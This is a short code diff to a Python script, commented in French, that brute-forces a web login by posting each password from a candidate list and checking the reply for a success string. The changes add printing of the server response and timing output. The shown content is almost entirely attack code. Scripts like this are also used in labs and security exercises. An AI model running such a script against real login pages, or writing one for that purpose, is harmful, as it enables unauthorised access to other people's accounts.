@@ -17,6 +17,7 @@ def try_password(password):
 
     # Envoyer la requête POST au serveur
     response = requests.post(url, data=data)
+    print(response.text)
     if "Login successful!" in response.text:
         print(f"Connexion réussie avec : {username} / {password}")
         return True
@@ -25,7 +26,7 @@ def try_password(password):
 
 
 
-def brute_force_attack(max_length=999999):
+def brute_force_attack():
     start_time = time.time()  # Commencer le chronomètr
     for password in resultats:
             print(f"Essai avec le mot de passe: {password}")
@@ -35,7 +36,8 @@ def brute_force_attack(max_length=999999):
                 end_time = time.time()  # Arrêter le chronomètre
                 print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")
                 return password  # Retourner le mot de passe trouvé et arrêter
-
+    end_time = time.time()  # Arrêter le chronomètre
+    print(f"Temps d'exécution: {end_time - start_time:.2f} secondes")    
 # Lancer l'attaque par force brute
 found_password = brute_force_attack()
 
